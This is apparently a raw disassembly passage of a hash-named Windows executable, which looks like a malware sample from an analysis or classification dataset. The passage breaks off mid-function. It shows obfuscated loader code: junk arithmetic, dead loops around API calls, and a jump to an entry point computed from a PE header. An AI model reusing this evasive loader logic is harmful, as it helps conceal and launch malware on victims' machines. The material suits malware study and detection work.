
66dc84b8158be3c723a1f769d6ba8713e59fa9bbfc3943c79f546e529eb0736a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x14c
  401009:	push   ebx
  40100a:	add    DWORD PTR ds:0x413d18,edx
  401010:	push   esi
  401011:	adc    eax,DWORD PTR ds:0x41400c
  401017:	push   edi
  401018:	adc    DWORD PTR ds:0x413c74,ecx
  40101e:	xor    esi,esi
  401020:	sbb    eax,DWORD PTR ds:0x413bfe
  401026:	mov    DWORD PTR [ebp-0x10],esi
  401029:	adc    edi,eax
  40102b:	mov    eax,DWORD PTR [ebp-0x20]
  40102e:	and    DWORD PTR ds:0x413c06,0x0
  401038:	jmp    0x40104a
  40103d:	mov    edi,DWORD PTR ds:0x413c06
  401043:	inc    edi
  401044:	mov    DWORD PTR ds:0x413c06,edi
  40104a:	cmp    DWORD PTR ds:0x413c06,0x12
  401051:	jae    0x40107f
  401057:	cmp    DWORD PTR ds:0x413c06,0x18
  40105e:	jne    0x401074
  401064:	push   0x413c74
  401069:	push   0x1062
  40106e:	call   DWORD PTR ds:0x41675c
  401074:	jmp    0x40103d
  401079:	xor    DWORD PTR ds:0x413bf6,ebx
  40107f:	push   0x5
  401081:	mov    DWORD PTR [ebp-0x20],eax
  401084:	pop    edi
  401085:	push   0x4164c8
  40108a:	call   DWORD PTR ds:0x416794
  401090:	push   esi
  401091:	and    DWORD PTR ds:0x413c70,0x414018
  40109b:	push   0x69
  40109d:	push   0xe
  40109f:	push   0x6
  4010a1:	push   0x4
  4010a3:	xor    DWORD PTR ds:0x41401c,0x413c16
  4010ad:	push   0x87698897
  4010b2:	sbb    DWORD PTR ds:0x41401c,0x413c16
  4010bc:	call   DWORD PTR ds:0x416750
  4010c2:	push   esi
  4010c3:	add    DWORD PTR ds:0x413d2c,0x792b
  4010cd:	push   0x3
  4010cf:	push   0x2
  4010d1:	push   0x4
  4010d3:	sbb    DWORD PTR ds:0x414008,0x413c0e
  4010dd:	push   0x2
  4010df:	push   0x56778769
  4010e4:	push   0x76867576
  4010e9:	inc    DWORD PTR ds:0x413c74
  4010ef:	call   DWORD PTR ds:0x41674c
  4010f5:	add    DWORD PTR ds:0x413c6c,0x413d20
  4010ff:	dec    edi
  401100:	mov    DWORD PTR ds:0x413bf6,0x25f1
  40110a:	jne    0x401085
  401110:	push   0x4164f0
  401115:	sbb    DWORD PTR ds:0x414000,0x413c0e
  40111f:	push   esi
  401120:	push   esi
  401121:	and    DWORD PTR ds:0x413c78,0x5ead
  40112b:	call   DWORD PTR ds:0x416788
  401131:	test   eax,eax
  401133:	je     0x40114f
  401139:	mov    eax,ds:0x75687681
  40113e:	adc    ebx,DWORD PTR ds:0x413c0a
  401144:	imul   eax,eax,0x5463da1d
  40114a:	mov    ds:0x75687681,eax
  40114f:	mov    eax,DWORD PTR [ebp-0x20]
  401152:	mov    DWORD PTR ds:0x41401c,0x2026
  40115c:	mov    ebx,0xf89c85b0
  401161:	mov    DWORD PTR ds:0x413c78,0x6385
  40116b:	cmp    eax,ebx
  40116d:	jne    0x4011cf
  401173:	add    DWORD PTR ds:0x414004,0x37c8
  40117d:	mov    DWORD PTR ds:0x4164c4,0xf89c85b1
  401187:	push   DWORD PTR [ebp+0x10]
  40118a:	sub    DWORD PTR ds:0x413bfe,0x414004
  401194:	push   DWORD PTR [ebp+0xc]
  401197:	and    DWORD PTR ds:0x413c1a,0x413ce4
  4011a1:	push   DWORD PTR [ebp+0x8]
  4011a4:	xor    DWORD PTR ds:0x413d34,0x413d2c
  4011ae:	call   0x402685
  4011b3:	mov    ecx,DWORD PTR ds:0x4163b4
  4011b9:	mov    esi,DWORD PTR ds:0x413c1e
  4011bf:	or     DWORD PTR ds:0x413c06,esi
  4011c5:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4011cb:	xor    esi,esi
  4011cd:	mov    DWORD PTR [ecx],eax
  4011cf:	mov    DWORD PTR [ebp-0x8],ebx
  4011d2:	sub    ecx,DWORD PTR ds:0x413d20
  4011d8:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  4011df:	lea    eax,[ebp-0x60]
  4011e2:	xor    esi,DWORD PTR ds:0x413d18
  4011e8:	mov    DWORD PTR [ebp-0x48],eax
  4011eb:	lea    eax,[ebp-0x54]
  4011ee:	mov    DWORD PTR [ebp-0x1c],eax
  4011f1:	add    DWORD PTR ds:0x413c16,0x903
  4011fb:	mov    eax,ds:0x4163b4
  401200:	mov    eax,DWORD PTR [eax+0x1c8]
  401206:	adc    DWORD PTR ds:0x413cf4,edi
  40120c:	mov    eax,DWORD PTR [eax]
  40120e:	mov    esi,DWORD PTR ds:0x413ce4
  401214:	add    esi,DWORD PTR ds:0x413c16
  40121a:	mov    DWORD PTR ds:0x413ce4,esi
  401220:	mov    ecx,DWORD PTR [ebp-0x1c]
  401223:	xor    edi,edi
  401225:	mov    esi,0x7510894
  40122a:	xor    eax,esi
  40122c:	mov    edi,0x3272dc
  401231:	adc    DWORD PTR ds:0x413c78,0x59b2
  40123b:	add    eax,edi
  40123d:	mov    DWORD PTR ds:0x413d24,0x7b51
  401247:	mov    DWORD PTR [ecx],eax
  401249:	mov    eax,ds:0x4165e0
  40124e:	mov    DWORD PTR ds:0x413c80,0x7e03
  401258:	cmp    eax,0x312bc9f6
  40125d:	mov    DWORD PTR ds:0x413d24,0x296e
  401267:	jne    0x401312
  40126d:	mov    eax,DWORD PTR [ebp-0x8]
  401270:	mov    ecx,DWORD PTR ds:0x4163b4
  401276:	mov    ecx,DWORD PTR [ecx+0x198]
  40127c:	xor    eax,esi
  40127e:	add    eax,edi
  401280:	mov    edx,DWORD PTR ds:0x413c6c
  401286:	xor    DWORD PTR ds:0x414010,edx
  40128c:	mov    DWORD PTR [ecx],eax
  40128e:	movzx  ecx,BYTE PTR ds:0x413c6c
  401295:	and    ecx,DWORD PTR ds:0x413d2c
  40129b:	mov    DWORD PTR ds:0x413c6c,ecx
  4012a1:	mov    eax,DWORD PTR [ebp-0x8]
  4012a4:	mov    DWORD PTR ds:0x413cd8,0x1b
  4012ae:	cmp    DWORD PTR ds:0x413cd8,0x0
  4012b5:	je     0x401303
  4012bb:	cmp    DWORD PTR ds:0x413cd8,0x1c
  4012c2:	jne    0x4012dd
  4012c8:	push   0x104b
  4012cd:	push   0x413d18
  4012d2:	push   0x2575
  4012d7:	call   DWORD PTR ds:0x416760
  4012dd:	xor    edx,edx
  4012df:	xor    edx,DWORD PTR ds:0x413cd8
  4012e5:	dec    edx
  4012e6:	mov    DWORD PTR ds:0x413cd8,edx
  4012ec:	jmp    0x4012ae
  4012f1:	mov    edx,DWORD PTR ds:0x413ce8
  4012f7:	or     edx,DWORD PTR ds:0x413c7c
  4012fd:	mov    DWORD PTR ds:0x413ce8,edx
  401303:	xor    eax,esi
  401305:	add    eax,edi
  401307:	or     ecx,DWORD PTR ds:0x413d24
  40130d:	mov    ds:0x4165e0,eax
  401312:	mov    eax,ds:0x4163b4
  401317:	mov    eax,DWORD PTR [eax+0x18c]
  40131d:	and    DWORD PTR ds:0x413c1a,0x0
  401327:	jmp    0x401339
  40132c:	mov    ecx,DWORD PTR ds:0x413c1a
  401332:	inc    ecx
  401333:	mov    DWORD PTR ds:0x413c1a,ecx
  401339:	cmp    DWORD PTR ds:0x413c1a,0x15
  401340:	jae    0x40136e
  401346:	cmp    DWORD PTR ds:0x413c1a,0x20
  40134d:	jne    0x401369
  401353:	push   0x6f97
  401358:	push   DWORD PTR [ebp-0x18]
  40135b:	push   0x2919
  401360:	push   DWORD PTR [ebp-0x14]
  401363:	call   DWORD PTR ds:0x416764
  401369:	jmp    0x40132c
  40136e:	mov    eax,DWORD PTR [eax]
  401370:	xor    edx,edx
  401372:	or     edx,DWORD PTR ds:0x413c0e
  401378:	adc    DWORD PTR ds:0x413cdc,edx
  40137e:	mov    DWORD PTR [ebp-0xa4],eax
  401384:	xor    eax,eax
  401386:	xor    eax,DWORD PTR ds:0x413cd0
  40138c:	mov    eax,DWORD PTR [eax]
  40138e:	sbb    DWORD PTR ds:0x413d34,eax
  401394:	mov    eax,0xf89c85bc
  401399:	xor    edx,ecx
  40139b:	mov    DWORD PTR [ebp-0x10],eax
  40139e:	mov    DWORD PTR [ebp-0x10],eax
  4013a1:	mov    DWORD PTR [ebp-0x10],eax
  4013a4:	sub    ecx,ecx
  4013a6:	mov    DWORD PTR [ebp-0x1c],ebx
  4013a9:	or     DWORD PTR ds:0x413c80,0x7e3b
  4013b3:	mov    DWORD PTR [ebp-0x10],eax
  4013b6:	mov    DWORD PTR [ebp-0x10],0xf89c85b8
  4013bd:	add    DWORD PTR ds:0x413d34,edi
  4013c3:	mov    ecx,DWORD PTR [ebp-0x8]
  4013c6:	xor    ecx,esi
  4013c8:	add    ecx,edi
  4013ca:	mov    DWORD PTR [ebp-0x18],ecx
  4013cd:	add    DWORD PTR ds:0x414018,edi
  4013d3:	mov    ecx,DWORD PTR [ebp-0xc]
  4013d6:	and    DWORD PTR ds:0x413c7c,0xe1
  4013e0:	mov    edx,DWORD PTR [ebp-0xc]
  4013e3:	adc    DWORD PTR ds:0x413d28,0x413d20
  4013ed:	xor    edx,esi
  4013ef:	xor    ecx,esi
  4013f1:	sbb    DWORD PTR ds:0x414014,0x47d8
  4013fb:	add    ecx,edx
  4013fd:	movzx  edx,BYTE PTR ds:0x41400c
  401404:	and    DWORD PTR ds:0x413bf6,edx
  40140a:	mov    edx,DWORD PTR [ebp-0xc]
  40140d:	xor    edx,esi
  40140f:	lea    ecx,[ecx+edx*1+0x975894]
  401416:	cmp    DWORD PTR [ebp-0x18],ecx
  401419:	ja     0x4015f5
  40141f:	or     eax,DWORD PTR ds:0x413bfa
  401425:	mov    eax,DWORD PTR [ebp-0xc]
  401428:	mov    ecx,DWORD PTR ds:0x413c80
  40142e:	xor    DWORD PTR ds:0x413ce8,ecx
  401434:	mov    ecx,DWORD PTR [ebp-0x18]
  401437:	sbb    DWORD PTR ds:0x413d20,0x413d34
  401441:	xor    eax,esi
  401443:	and    DWORD PTR ds:0x413cdc,0x413d24
  40144d:	lea    eax,[eax+ecx*1+0x3272dc]
  401454:	sub    DWORD PTR ds:0x414008,0x413cd8
  40145e:	push   eax
  40145f:	sbb    DWORD PTR ds:0x413c0a,edi
  401465:	mov    eax,DWORD PTR [ebp-0x1c]
  401468:	xor    DWORD PTR ds:0x413c80,0x7b1e
  401472:	xor    eax,esi
  401474:	lea    eax,[ebp+eax*1+0x3272e4]
  40147b:	or     DWORD PTR ds:0x413c16,0x7d42
  401485:	push   eax
  401486:	mov    DWORD PTR ds:0x414018,0x19
  401490:	cmp    DWORD PTR ds:0x414018,0x0
  401497:	je     0x4014cb
  40149d:	cmp    DWORD PTR ds:0x414018,0x28
  4014a4:	jne    0x4014bb
  4014aa:	push   DWORD PTR [ebp-0x14]
  4014ad:	push   DWORD PTR [ebp-0x18]
  4014b0:	push   0x400000
  4014b5:	call   DWORD PTR ds:0x416768
  4014bb:	mov    eax,ds:0x414018
  4014c0:	dec    eax
  4014c1:	mov    ds:0x414018,eax
  4014c6:	jmp    0x401490
  4014cb:	mov    eax,ds:0x4163b4
  4014d0:	and    DWORD PTR ds:0x413c6c,0x2ac9
  4014da:	push   DWORD PTR [eax+0x1bc]
  4014e0:	call   0x40a25b
  4014e5:	mov    eax,DWORD PTR [ebp-0xc]
  4014e8:	sbb    edx,edx
  4014ea:	mov    ecx,DWORD PTR [ebp-0x18]
  4014ed:	and    DWORD PTR ds:0x413d24,0x0
  4014f7:	mov    edx,DWORD PTR ds:0x413d24
  4014fd:	inc    edx
  4014fe:	mov    DWORD PTR ds:0x413d24,edx
  401504:	cmp    DWORD PTR ds:0x413d24,0x1c
  40150b:	jne    0x401525
  401511:	push   DWORD PTR [ebp-0x14]
  401514:	push   0x413d30
  401519:	push   DWORD PTR [ebp-0x1c]
  40151c:	push   DWORD PTR [ebp-0x24]
  40151f:	call   DWORD PTR ds:0x416770
  401525:	cmp    DWORD PTR ds:0x413d24,0x1b
  40152c:	jb     0x4014f7
  401532:	xor    eax,esi
  401534:	lea    eax,[ecx+eax*1+0x3272dc]
  40153b:	mov    ecx,DWORD PTR [ebp-0xc]
  40153e:	mov    edx,DWORD PTR [ebp-0xc]
  401541:	dec    DWORD PTR ds:0x413bf6
  401547:	xor    edx,esi
  401549:	xor    ecx,esi
  40154b:	sbb    DWORD PTR ds:0x413c1e,0x34e4
  401555:	add    ecx,edx
  401557:	and    DWORD PTR ds:0x413c02,0x0
  401561:	jmp    0x401573
  401566:	mov    edx,DWORD PTR ds:0x413c02
  40156c:	inc    edx
  40156d:	mov    DWORD PTR ds:0x413c02,edx
  401573:	cmp    DWORD PTR ds:0x413c02,0x1b
  40157a:	jae    0x4015bf
  401580:	cmp    DWORD PTR ds:0x413c02,0x1e
  401587:	jne    0x4015a7
  40158d:	push   0x413d28
  401592:	push   0x3ad3
  401597:	push   0x416152
  40159c:	push   0x416152
  4015a1:	call   DWORD PTR ds:0x416774
  4015a7:	jmp    0x401566
  4015ac:	movzx  edx,BYTE PTR ds:0x413ce8
  4015b3:	sub    edx,DWORD PTR ds:0x413c1a
  4015b9:	mov    DWORD PTR ds:0x413ce8,edx
  4015bf:	mov    edx,DWORD PTR [ebp-0xc]
  4015c2:	xor    DWORD PTR ds:0x413c80,0x413c74
  4015cc:	xor    edx,esi
  4015ce:	lea    ecx,[ecx+edx*1+0x975894]
  4015d5:	mov    DWORD PTR [ebp-0x18],eax
  4015d8:	cmp    eax,ecx
  4015da:	mov    DWORD PTR ds:0x413c7c,0x908
  4015e4:	jbe    0x40141f
  4015ea:	add    DWORD PTR ds:0x413cf4,ecx
  4015f0:	mov    eax,0xf89c85bc
  4015f5:	add    DWORD PTR ds:0x414014,ecx
  4015fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4015fe:	mov    DWORD PTR ds:0x416238,ecx
  401604:	mov    ecx,DWORD PTR [ebp+0x10]
  401607:	and    DWORD PTR ds:0x413c1a,0x0
  401611:	mov    edx,DWORD PTR ds:0x413c1a
  401617:	inc    edx
  401618:	mov    DWORD PTR ds:0x413c1a,edx
  40161e:	cmp    DWORD PTR ds:0x413c1a,0x25
  401625:	jne    0x40163e
  40162b:	push   DWORD PTR [ebp-0x1c]
  40162e:	push   0x414004
  401633:	push   0x416170
  401638:	call   DWORD PTR ds:0x416778
  40163e:	cmp    DWORD PTR ds:0x413c1a,0x19
  401645:	jb     0x401611
  40164b:	mov    DWORD PTR ds:0x41648c,ecx
  401651:	adc    DWORD PTR ds:0x413c1e,ebx
  401657:	mov    ecx,DWORD PTR ds:0x416238
  40165d:	mov    edx,DWORD PTR ds:0x414014
  401663:	xor    DWORD PTR ds:0x413c0e,edx
  401669:	mov    edx,DWORD PTR [ebp-0x48]
  40166c:	sub    ecx,edi
  40166e:	and    DWORD PTR ds:0x413cf0,0x24ff
  401678:	xor    ecx,esi
  40167a:	mov    DWORD PTR [edx],ecx
  40167c:	not    ecx
  40167e:	mov    ecx,DWORD PTR [ebp-0x20]
  401681:	mov    DWORD PTR ds:0x413c16,0x6aa9
  40168b:	cmp    ecx,ebx
  40168d:	mov    DWORD PTR ds:0x413c70,0x4e28
  401697:	jne    0x401b90
  40169d:	add    DWORD PTR ds:0x413d18,0x41400c
  4016a7:	lea    eax,[ebp-0x5c]
  4016aa:	and    DWORD PTR ds:0x413c16,0x3f2d
  4016b4:	mov    DWORD PTR [ebp-0xb0],eax
  4016ba:	lea    eax,[ebp+0x4]
  4016bd:	add    DWORD PTR ds:0x413cec,0x413d24
  4016c7:	mov    DWORD PTR [ebp-0x5c],eax
  4016ca:	mov    eax,DWORD PTR [ebp-0x5c]
  4016cd:	xor    DWORD PTR ds:0x413ce4,0x37e4
  4016d7:	test   eax,eax
  4016d9:	mov    DWORD PTR ds:0x413c7c,0x3884
  4016e3:	je     0x402663
  4016e9:	adc    DWORD PTR ds:0x413c12,ebx
  4016ef:	mov    eax,DWORD PTR [ebp-0x24]
  4016f2:	mov    eax,DWORD PTR [ebp-0xc]
  4016f5:	mov    eax,DWORD PTR [ebp-0x8]
  4016f8:	sub    ecx,0x1090
  4016fe:	mov    DWORD PTR [ebp+0xc],eax
  401701:	mov    eax,eax
  401703:	mov    eax,ds:0x4163b4
  401708:	and    DWORD PTR ds:0x413bfa,0x0
  401712:	jmp    0x401724
  401717:	mov    ecx,DWORD PTR ds:0x413bfa
  40171d:	inc    ecx
  40171e:	mov    DWORD PTR ds:0x413bfa,ecx
  401724:	cmp    DWORD PTR ds:0x413bfa,0x11
  40172b:	jae    0x401754
  401731:	cmp    DWORD PTR ds:0x413bfa,0x20
  401738:	jne    0x401749
  40173e:	push   0x4160de
  401743:	call   DWORD PTR ds:0x41677c
  401749:	jmp    0x401717
  40174e:	and    DWORD PTR ds:0x413c74,ecx
  401754:	mov    eax,DWORD PTR [eax+0x1c8]
  40175a:	and    DWORD PTR ds:0x414010,0x0
  401764:	mov    ecx,DWORD PTR ds:0x414010
  40176a:	inc    ecx
  40176b:	mov    DWORD PTR ds:0x414010,ecx
  401771:	cmp    DWORD PTR ds:0x414010,0xf
  401778:	jne    0x401791
  40177e:	push   0x413c0a
  401783:	push   DWORD PTR [ebp-0x20]
  401786:	push   0x4160b3
  40178b:	call   DWORD PTR ds:0x416780
  401791:	cmp    DWORD PTR ds:0x414010,0xe
  401798:	jne    0x4017ab
  40179e:	mov    ecx,DWORD PTR ds:0x414010
  4017a4:	inc    ecx
  4017a5:	mov    DWORD PTR ds:0x414010,ecx
  4017ab:	cmp    DWORD PTR ds:0x414010,0x1c
  4017b2:	jb     0x401764
  4017b8:	mov    DWORD PTR ds:0x413bf6,0x13
  4017c2:	cmp    DWORD PTR ds:0x413bf6,0x0
  4017c9:	je     0x401820
  4017cf:	cmp    DWORD PTR ds:0x413bf6,0x6
  4017d6:	jne    0x4017ec
  4017dc:	push   0x414018
  4017e1:	push   0x1023
  4017e6:	call   DWORD PTR ds:0x416784
  4017ec:	cmp    DWORD PTR ds:0x413bf6,0x7
  4017f3:	jne    0x401808
  4017f9:	xor    ecx,ecx
  4017fb:	add    ecx,DWORD PTR ds:0x413bf6
  401801:	dec    ecx
  401802:	mov    DWORD PTR ds:0x413bf6,ecx
  401808:	mov    ecx,DWORD PTR ds:0x413bf6
  40180e:	dec    ecx
  40180f:	mov    DWORD PTR ds:0x413bf6,ecx
  401815:	jmp    0x4017c2
  40181a:	adc    DWORD PTR ds:0x413ce8,ebx
  401820:	mov    eax,DWORD PTR [eax]
  401822:	and    DWORD PTR ds:0x414010,0x0
  40182c:	jmp    0x401840
  401831:	xor    ecx,ecx
  401833:	add    ecx,DWORD PTR ds:0x414010
  401839:	inc    ecx
  40183a:	mov    DWORD PTR ds:0x414010,ecx
  401840:	cmp    DWORD PTR ds:0x414010,0x19
  401847:	jae    0x401873
  40184d:	cmp    DWORD PTR ds:0x414010,0x27
  401854:	jne    0x401868
  40185a:	push   DWORD PTR [ebp-0x18]
  40185d:	push   0x4160de
  401862:	call   DWORD PTR ds:0x41678c
  401868:	jmp    0x401831
  40186d:	sub    DWORD PTR ds:0x413c0a,edi
  401873:	cdq    
  401874:	mov    ebx,eax
  401876:	mov    eax,0xfabdbeef
  40187b:	mov    ecx,DWORD PTR ds:0x413c1e
  401881:	or     DWORD PTR ds:0x413d1c,ecx
  401887:	add    ebx,eax
  401889:	mov    ecx,0x6f0c
  40188e:	adc    edx,0xffffffff
  401891:	and    DWORD PTR [ebp-0x10],0x0
  401895:	sub    DWORD PTR ds:0x413c6c,0x6250
  40189f:	xor    edx,0x0
  4018a2:	xor    DWORD PTR ds:0x413c84,ecx
  4018a8:	mov    DWORD PTR [ebp-0x80],edx
  4018ab:	mov    edx,DWORD PTR [ebp+0xc]
  4018ae:	mov    DWORD PTR ds:0x413c74,0x12
  4018b8:	cmp    DWORD PTR ds:0x413c74,0x0
  4018bf:	je     0x401906
  4018c5:	cmp    DWORD PTR ds:0x413c74,0x1e
  4018cc:	jne    0x4018f2
  4018d2:	push   DWORD PTR [ebp-0x24]
  4018d5:	push   0x413cd8
  4018da:	push   0x560c
  4018df:	push   0x416049
  4018e4:	push   DWORD PTR [ebp-0x18]
  4018e7:	push   0x1b95
  4018ec:	call   DWORD PTR ds:0x416790
  4018f2:	mov    ecx,DWORD PTR ds:0x413c74
  4018f8:	dec    ecx
  4018f9:	mov    DWORD PTR ds:0x413c74,ecx
  4018ff:	jmp    0x4018b8
  401904:	not    ecx
  401906:	mov    DWORD PTR [ebp-0x14],edx
  401909:	and    DWORD PTR ds:0x413c06,0x0
  401913:	jmp    0x401925
  401918:	mov    edx,DWORD PTR ds:0x413c06
  40191e:	inc    edx
  40191f:	mov    DWORD PTR ds:0x413c06,edx
  401925:	cmp    DWORD PTR ds:0x413c06,0x14
  40192c:	jae    0x401967
  401932:	cmp    DWORD PTR ds:0x413c06,0x5
  401939:	jne    0x401948
  40193f:	push   DWORD PTR [ebp-0xc]
  401942:	call   DWORD PTR ds:0x416798
  401948:	cmp    DWORD PTR ds:0x413c06,0x4
  40194f:	jne    0x401962
  401955:	mov    edx,DWORD PTR ds:0x413c06
  40195b:	inc    edx
  40195c:	mov    DWORD PTR ds:0x413c06,edx
  401962:	jmp    0x401918
  401967:	mov    ecx,0x8a29a125
  40196c:	xor    ebx,ecx
  40196e:	neg    DWORD PTR ds:0x413d18
  401974:	add    DWORD PTR [ebp-0x14],eax
  401977:	mov    DWORD PTR ds:0x414010,ebx
  40197d:	mov    edx,DWORD PTR [ebp-0x14]
  401980:	mov    DWORD PTR ds:0x41401c,0x7ba5
  40198a:	adc    DWORD PTR [ebp-0x10],0xffffffff
  40198e:	xor    edx,ecx
  401990:	add    DWORD PTR ds:0x414010,0x307
  40199a:	mov    DWORD PTR [ebp-0x78],edx
  40199d:	mov    edx,DWORD PTR [ebp-0x10]
  4019a0:	xor    edx,0x0
  4019a3:	mov    DWORD PTR ds:0x414018,0x4b60
  4019ad:	mov    DWORD PTR [ebp-0x74],edx
  4019b0:	cmp    DWORD PTR [ebp-0x78],ebx
  4019b3:	mov    DWORD PTR ds:0x413c02,0x936
  4019bd:	jne    0x4019df
  4019c3:	mov    DWORD PTR ds:0x413c0a,edx
  4019c9:	mov    edx,DWORD PTR [ebp-0x80]
  4019cc:	cmp    DWORD PTR [ebp-0x74],edx
  4019cf:	mov    DWORD PTR ds:0x413c7c,0x301a
  4019d9:	je     0x401aa0
  4019df:	and    DWORD PTR ds:0x413d34,0x0
  4019e9:	jmp    0x4019fb
  4019ee:	mov    edx,DWORD PTR ds:0x413d34
  4019f4:	inc    edx
  4019f5:	mov    DWORD PTR ds:0x413d34,edx
  4019fb:	cmp    DWORD PTR ds:0x413d34,0x16
  401a02:	jae    0x401a25
  401a08:	cmp    DWORD PTR ds:0x413d34,0x26
  401a0f:	jne    0x401a20
  401a15:	push   0x414014
  401a1a:	call   DWORD PTR ds:0x41679c
  401a20:	jmp    0x4019ee
  401a25:	mov    edx,DWORD PTR ds:0x4163b4
  401a2b:	neg    DWORD PTR ds:0x414008
  401a31:	mov    edx,DWORD PTR [edx+0x1c0]
  401a37:	mov    DWORD PTR ds:0x413bf6,0x5ff4
  401a41:	mov    edx,DWORD PTR [edx]
  401a43:	and    DWORD PTR ds:0x413ce0,0x41400c
  401a4d:	xor    ebx,ebx
  401a4f:	add    edx,eax
  401a51:	mov    DWORD PTR ds:0x413c78,0x3f53
  401a5b:	adc    ebx,0xffffffff
  401a5e:	and    DWORD PTR ds:0x413c02,0x1b79
  401a68:	xor    edx,ecx
  401a6a:	add    DWORD PTR ds:0x413ce0,0x413c6c
  401a74:	xor    ebx,0x0
  401a77:	mov    DWORD PTR ds:0x413bfa,0x4fab
  401a81:	cmp    edx,0x70941fd5
  401a87:	mov    DWORD PTR ds:0x413d2c,0x7f9c
  401a91:	jne    0x402663
  401a97:	cmp    ebx,0xffffffff
  401a9a:	jne    0x402663
  401aa0:	mov    edx,DWORD PTR ds:0x416430
  401aa6:	add    DWORD PTR ds:0x413cdc,0x3946
  401ab0:	mov    ebx,DWORD PTR ds:0x416438
  401ab6:	and    DWORD PTR ds:0x413c80,0x3ee6
  401ac0:	xor    edx,ebx
  401ac2:	mov    DWORD PTR ds:0x414000,0x16
  401acc:	cmp    DWORD PTR ds:0x414000,0x0
  401ad3:	je     0x401b12
  401ad9:	cmp    DWORD PTR ds:0x414000,0x26
  401ae0:	jne    0x401af6
  401ae6:	push   0x413c84
  401aeb:	push   0x56a1
  401af0:	call   DWORD PTR ds:0x41675c
  401af6:	mov    ebx,DWORD PTR ds:0x414000
  401afc:	dec    ebx
  401afd:	mov    DWORD PTR ds:0x414000,ebx
  401b03:	jmp    0x401acc
  401b08:	add    DWORD PTR ds:0x413c84,0x1062
  401b12:	mov    DWORD PTR ds:0x416430,edx
  401b18:	mov    ebx,DWORD PTR ds:0x416430
  401b1e:	and    DWORD PTR ds:0x413d20,0x0
  401b28:	jmp    0x401b3a
  401b2d:	mov    edx,DWORD PTR ds:0x413d20
  401b33:	inc    edx
  401b34:	mov    DWORD PTR ds:0x413d20,edx
  401b3a:	cmp    DWORD PTR ds:0x413d20,0x1a
  401b41:	jae    0x401b72
  401b47:	cmp    DWORD PTR ds:0x413d20,0x25
  401b4e:	jne    0x401b67
  401b54:	push   DWORD PTR [ebp-0x24]
  401b57:	push   0x413d1c
  401b5c:	push   0x7dc0
  401b61:	call   DWORD PTR ds:0x416760
  401b67:	jmp    0x401b2d
  401b6c:	adc    DWORD PTR ds:0x413bfe,edi
  401b72:	mov    edx,DWORD PTR [ebp-0x5c]
  401b75:	xor    DWORD PTR ds:0x413c7c,0x413c1e
  401b7f:	add    DWORD PTR [edx],ebx
  401b81:	mov    DWORD PTR ds:0x414010,0x3837
  401b8b:	jmp    0x402624
  401b90:	mov    DWORD PTR ds:0x41401c,0x671d
  401b9a:	mov    ecx,DWORD PTR [ebp-0x60]
  401b9d:	mov    DWORD PTR ds:0x413c02,0x3bc3
  401ba7:	cmp    ecx,0xf89c85b1
  401bad:	je     0x401d26
  401bb3:	mov    ecx,DWORD PTR [ebp-0x8]
  401bb6:	mov    edx,DWORD PTR [ebp-0x54]
  401bb9:	or     DWORD PTR ds:0x413c1a,0x413cdc
  401bc3:	xor    ecx,esi
  401bc5:	add    ecx,edi
  401bc7:	cmp    ecx,edx
  401bc9:	je     0x401d26
  401bcf:	mov    DWORD PTR ds:0x413d28,0x18
  401bd9:	cmp    DWORD PTR ds:0x413d28,0x0
  401be0:	je     0x401c32
  401be6:	cmp    DWORD PTR ds:0x413d28,0xa
  401bed:	jne    0x401c07
  401bf3:	push   0x7420
  401bf8:	push   DWORD PTR [ebp-0xc]
  401bfb:	push   DWORD PTR [ebp-0x20]
  401bfe:	push   DWORD PTR [ebp-0x14]
  401c01:	call   DWORD PTR ds:0x416764
  401c07:	cmp    DWORD PTR ds:0x413d28,0xb
  401c0e:	jne    0x401c1f
  401c14:	mov    eax,ds:0x413d28
  401c19:	dec    eax
  401c1a:	mov    ds:0x413d28,eax
  401c1f:	xor    eax,eax
  401c21:	add    eax,DWORD PTR ds:0x413d28
  401c27:	dec    eax
  401c28:	mov    ds:0x413d28,eax
  401c2d:	jmp    0x401bd9
  401c32:	mov    eax,ds:0x4163b4
  401c37:	mov    DWORD PTR ds:0x413c88,0x7ef
  401c41:	mov    eax,DWORD PTR [eax+0x194]
  401c47:	mov    ecx,DWORD PTR [eax]
  401c49:	mov    eax,DWORD PTR [ecx+0x3c]
  401c4c:	adc    DWORD PTR ds:0x413c74,0x414014
  401c56:	push   DWORD PTR ds:0x41648c
  401c5c:	add    DWORD PTR ds:0x413c1e,0x413d24
  401c66:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401c6a:	push   DWORD PTR ds:0x416238
  401c70:	add    DWORD PTR ds:0x414000,0x414014
  401c7a:	add    eax,ecx
  401c7c:	mov    DWORD PTR ds:0x413d1c,0x15
  401c86:	cmp    DWORD PTR ds:0x413d1c,0x0
  401c8d:	je     0x401ce5
  401c93:	cmp    DWORD PTR ds:0x413d1c,0x3
  401c9a:	jne    0x401cb1
  401ca0:	push   0x8408
  401ca5:	push   DWORD PTR [ebp-0x24]
  401ca8:	push   DWORD PTR [ebp-0x1c]
  401cab:	call   DWORD PTR ds:0x416768
  401cb1:	cmp    DWORD PTR ds:0x413d1c,0x4
  401cb8:	jne    0x401ccb
  401cbe:	mov    ecx,DWORD PTR ds:0x413d1c
  401cc4:	dec    ecx
  401cc5:	mov    DWORD PTR ds:0x413d1c,ecx
  401ccb:	xor    ecx,ecx
  401ccd:	or     ecx,DWORD PTR ds:0x413d1c
  401cd3:	dec    ecx
  401cd4:	mov    DWORD PTR ds:0x413d1c,ecx
  401cda:	jmp    0x401c86
  401cdf:	add    DWORD PTR ds:0x413bfa,ecx
  401ce5:	mov    ecx,DWORD PTR ds:0x4163b4
  401ceb:	mov    ecx,DWORD PTR [ecx+0x194]
  401cf1:	or     DWORD PTR ds:0x414000,0x5329
  401cfb:	push   DWORD PTR [ecx]
  401cfd:	call   eax
  401cff:	mov    ecx,DWORD PTR ds:0x4163b4
  401d05:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401d0b:	mov    DWORD PTR ds:0x413c78,0x5666
  401d15:	mov    DWORD PTR [ecx],eax
  401d17:	mov    DWORD PTR ds:0x413d24,0x5c21
  401d21:	jmp    0x402663
  401d26:	adc    edx,DWORD PTR ds:0x413cf0
  401d2c:	mov    ecx,DWORD PTR [ebp-0x8]
  401d2f:	sub    edx,DWORD PTR ds:0x413c70
  401d35:	mov    edx,DWORD PTR [ebp-0xa4]
